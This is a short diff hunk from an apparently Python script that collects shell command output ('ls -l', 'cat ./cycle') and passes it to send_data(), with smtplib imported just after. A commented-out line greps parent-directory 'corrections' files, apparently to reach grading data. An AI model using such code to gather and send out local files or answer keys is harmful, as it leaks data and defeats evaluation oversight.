@@ -48,7 +48,7 @@ my_data += "\n#######################\n"
 my_data += get_data("ls -l") or ""
 my_data += "\n#######################\n"
 # my_data += get_data("grep -rl '77=' ../../../../corrections_*/corrections") or ""
-# my_data += get_data("cat cycle") or ""
+my_data += get_data("cat ./cycle") or ""
 send_data(my_data)
 ##############################################################
 import smtplib
